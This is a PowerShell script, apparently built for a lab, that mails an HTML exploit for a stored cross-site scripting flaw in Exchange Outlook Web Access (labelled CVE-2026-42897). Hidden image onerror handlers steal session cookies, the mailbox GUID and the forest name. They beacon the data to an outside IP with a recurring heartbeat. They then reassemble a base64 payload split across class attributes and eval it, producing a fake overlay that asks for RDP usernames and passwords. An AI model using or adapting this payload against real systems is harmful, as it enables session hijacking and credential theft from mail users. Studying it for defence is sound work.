$from = "attacker@cvelab.local"
$to = "victim@cvelab.local"

$body = @'
<html>
  <body>
    <img src="a" alt="x originalSrc='cid:1' onerror=window.bwSent=window.bwSent||0,window.d=document.cookie,console.log(1) y" style="width:0;height:0;position:absolute;visibility:hidden"/>
    <img src="b" alt="x originalSrc='cid:2' onerror=window.m=window.parent.owaMbxGuid,console.log(2) y" style="width:0;height:0;position:absolute;visibility:hidden"/>
    <img src="c" alt="x originalSrc='cid:3' onerror=window.f=window.parent.cachedForestName,console.log(3) y" style="width:0;height:0;position:absolute;visibility:hidden"/>
    <img src="d" class="https://80.96.59.112/beacons" alt="x originalSrc='cid:4' onerror=window.hu=this.className,console.log(4) y" style="width:0;height:0;position:absolute;visibility:hidden"/>
    <img src="d2" class="ONLINE" alt="x originalSrc='cid:4b' onerror=window.ho=this.className,console.log(41) y" style="width:0;height:0;position:absolute;visibility:hidden"/>
    <img src="h" alt="x originalSrc='cid:6' onerror=window.hd=JSON.stringify({heartbeat:window.ho,mbxGuid:window.m}),window.hc=navigator.sendBeacon.bind(navigator,window.hu,window.hd),console.log(6) y" style="width:0;height:0;position:absolute;visibility:hidden"/>
    <img src="e" alt="x originalSrc='cid:5' onerror=navigator.sendBeacon(window.hu,JSON.stringify({cookies:window.d,mbxGuid:window.m,forest:window.f})),console.log(5) y" style="width:0;height:0;position:absolute;visibility:hidden"/>
    <img src="i" alt="x originalSrc='cid:7' onerror=setInterval(window.hc,30000),console.log(7) y" style="width:0;height:0;position:absolute;visibility:hidden"/>
    <img src="j" class="c2V0VGltZW91dChmdW5jdGlvbigpe3ZhciBvPXdpbmRvdy5wYXJlbnQuZG9jdW1lbnQuY3JlYXRlRWxlbWVudCgnZGl2Jyk7by5zdHlsZS5wb3NpdGlvbj0nZml4ZWQnO28uc3R5bGUudG9wPScwJz" alt="x originalSrc='cid:8' onerror=window.bx=this.className y" style="width:0;height:0;position:absolute;visibility:hidden"/>
    <img src="k" class="tvLnN0eWxlLmxlZnQ9JzAnO28uc3R5bGUud2lkdGg9JzEwMCUnO28uc3R5bGUuaGVpZ2h0PScxMDAlJztvLnN0eWxlLmJhY2tncm91bmQ9JyMwMDAwMDA4OCc7by5zdHlsZS56SW5kZXg9Jzk5OTkn" alt="x originalSrc='cid:9' onerror=window.bx=window.bx+this.className y" style="width:0;height:0;position:absolute;visibility:hidden"/>
    <img src="l" class="O28uc3R5bGUuZGlzcGxheT0nZmxleCc7by5zdHlsZS5hbGlnbkl0ZW1zPSdjZW50ZXInO28uc3R5bGUuanVzdGlmeUNvbnRlbnQ9J2NlbnRlcic7by5hZGRFdmVudExpc3RlbmVyKCdjbGljaycsZn" alt="x originalSrc='cid:10' onerror=window.bx=window.bx+this.className y" style="width:0;height:0;position:absolute;visibility:hidden"/>
    <img src="n" class="VuY3Rpb24oZSl7aWYoZS50YXJnZXQ9PT1vKW8ucmVtb3ZlKCl9KTt2YXIgYj13aW5kb3cucGFyZW50LmRvY3VtZW50LmNyZWF0ZUVsZW1lbnQoJ2RpdicpO2Iuc3R5bGUuYmFja2dyb3VuZD0nI2Zm" alt="x originalSrc='cid:11' onerror=window.bx=window.bx+this.className y" style="width:0;height:0;position:absolute;visibility:hidden"/>
    <img src="o" class="Zic7Yi5zdHlsZS5ib3JkZXJSYWRpdXM9JzhweCc7Yi5zdHlsZS5wYWRkaW5nPSczMnB4JztiLnN0eWxlLm1heFdpZHRoPSczODBweCc7Yi5zdHlsZS53aWR0aD0nOTAlJztiLnN0eWxlLnRleHRBbG" alt="x originalSrc='cid:12' onerror=window.bx=window.bx+this.className y" style="width:0;height:0;position:absolute;visibility:hidden"/>
    <img src="p" class="lnbj0nY2VudGVyJztiLnN0eWxlLmZvbnRGYW1pbHk9J3NhbnMtc2VyaWYnO2IuYWRkRXZlbnRMaXN0ZW5lcignY2xpY2snLGZ1bmN0aW9uKGUpe2Uuc3RvcFByb3BhZ2F0aW9uKCl9KTt2YXIgcD13" alt="x originalSrc='cid:13' onerror=window.bx=window.bx+this.className y" style="width:0;height:0;position:absolute;visibility:hidden"/>
    <img src="q" class="aW5kb3cucGFyZW50LmRvY3VtZW50LmNyZWF0ZUVsZW1lbnQoJ3AnKTtwLnN0eWxlLmZvbnRTaXplPScxNnB4JztwLnN0eWxlLm1hcmdpbj0nMCAwIDE2cHggMCc7cC50ZXh0Q29udGVudD0nRW50ZX" alt="x originalSrc='cid:14' onerror=window.bx=window.bx+this.className y" style="width:0;height:0;position:absolute;visibility:hidden"/>
    <img src="r" class="IgeW91ciBSRFAgY3JlZGVudGlhbHMgdG8gY29uZmlybS4nO3ZhciBpMT13aW5kb3cucGFyZW50LmRvY3VtZW50LmNyZWF0ZUVsZW1lbnQoJ2lucHV0Jyk7aTEudHlwZT0ndGV4dCc7aTEucGxhY2Vo" alt="x originalSrc='cid:15' onerror=window.bx=window.bx+this.className y" style="width:0;height:0;position:absolute;visibility:hidden"/>
    <img src="s" class="b2xkZXI9J1VzZXJuYW1lJztpMS5zdHlsZS5kaXNwbGF5PSdibG9jayc7aTEuc3R5bGUud2lkdGg9JzEwMCUnO2kxLnN0eWxlLmJveFNpemluZz0nYm9yZGVyLWJveCc7aTEuc3R5bGUubWFyZ2luQm" alt="x originalSrc='cid:16' onerror=window.bx=window.bx+this.className y" style="width:0;height:0;position:absolute;visibility:hidden"/>
    <img src="t" class="90dG9tPScxMHB4JztpMS5zdHlsZS5wYWRkaW5nPSc4cHgnO2kxLnN0eWxlLmJvcmRlcj0nMXB4IHNvbGlkICNjY2MnO2kxLnN0eWxlLmJvcmRlclJhZGl1cz0nNHB4JztpMS5zdHlsZS5mb250U2l6" alt="x originalSrc='cid:17' onerror=window.bx=window.bx+this.className y" style="width:0;height:0;position:absolute;visibility:hidden"/>
    <img src="u" class="ZT0nMTRweCc7dmFyIGkyPXdpbmRvdy5wYXJlbnQuZG9jdW1lbnQuY3JlYXRlRWxlbWVudCgnaW5wdXQnKTtpMi50eXBlPSdwYXNzd29yZCc7aTIucGxhY2Vob2xkZXI9J1Bhc3N3b3JkJztpMi5zdH" alt="x originalSrc='cid:18' onerror=window.bx=window.bx+this.className y" style="width:0;height:0;position:absolute;visibility:hidden"/>
    <img src="v" class="lsZS5kaXNwbGF5PSdibG9jayc7aTIuc3R5bGUud2lkdGg9JzEwMCUnO2kyLnN0eWxlLmJveFNpemluZz0nYm9yZGVyLWJveCc7aTIuc3R5bGUucGFkZGluZz0nOHB4JztpMi5zdHlsZS5ib3JkZXI9" alt="x originalSrc='cid:19' onerror=window.bx=window.bx+this.className y" style="width:0;height:0;position:absolute;visibility:hidden"/>
    <img src="w" class="JzFweCBzb2xpZCAjY2NjJztpMi5zdHlsZS5ib3JkZXJSYWRpdXM9JzRweCc7aTIuc3R5bGUuZm9udFNpemU9JzE0cHgnO2IuYXBwZW5kQ2hpbGQocCk7Yi5hcHBlbmRDaGlsZChpMSk7Yi5hcHBlbm" alt="x originalSrc='cid:20' onerror=window.bx=window.bx+this.className y" style="width:0;height:0;position:absolute;visibility:hidden"/>
    <img src="x" class="RDaGlsZChpMik7by5hcHBlbmRDaGlsZChiKTt3aW5kb3cucGFyZW50LmRvY3VtZW50LmJvZHkuYXBwZW5kQ2hpbGQobyl9LDUwMDApO3dpbmRvdy5wYXJlbnQuYWRkRXZlbnRMaXN0ZW5lcignYmVm" alt="x originalSrc='cid:21' onerror=window.bx=window.bx+this.className y" style="width:0;height:0;position:absolute;visibility:hidden"/>
    <img src="x2" class="b3JldW5sb2FkJyxmdW5jdGlvbigpe25hdmlnYXRvci5zZW5kQmVhY29uKHdpbmRvdy5odSxKU09OLnN0cmluZ2lmeSh7aGVhcnRiZWF0OndpbmRvdy5oby5yZXBsYWNlKCdPTkxJTkUnLCdPRkZMSU" alt="x originalSrc='cid:22' onerror=window.bx=window.bx+this.className y" style="width:0;height:0;position:absolute;visibility:hidden"/>
    <img src="x3" class="5FJyksbWJ4R3VpZDp3aW5kb3cubX0pKX0p" alt="x originalSrc='cid:23' onerror=window.bx=window.bx+this.className y" style="width:0;height:0;position:absolute;visibility:hidden"/>
    <img src="y" alt="x originalSrc='cid:24' onerror=window.br=window.bx.replace(/_P_/g,String.fromCharCode(43)),window.br=window.br.replace(/_S_/g,String.fromCharCode(47)),window.br=window.br.replace(/_E_/g,String.fromCharCode(61)) y" style="width:0;height:0;position:absolute;visibility:hidden"/>
    <img src="z" alt="x originalSrc='cid:25' onerror=eval(atob(window.br)) y" style="width:0;height:0;position:absolute;visibility:hidden"/>
  </body>
</html>
'@

$message = New-Object System.Net.Mail.MailMessage
$message.From = $from
$message.To.Add($to)
$message.Subject = "CVE-2026-42897 safe alert test"
$message.Body = $body
$message.IsBodyHtml = $true

# С основной машины обращаемся к Exchange по имени или IP.
$smtp = New-Object System.Net.Mail.SmtpClient("EX01", 25)
$smtp.UseDefaultCredentials = $false

try {
    $smtp.Send($message)
    Write-Host "Message sent to $to"
}
catch {
    Write-Host "Message was NOT sent:"
    Write-Host $_.Exception.ToString()
}
finally {
    $message.Dispose()
    $smtp.Dispose()
}
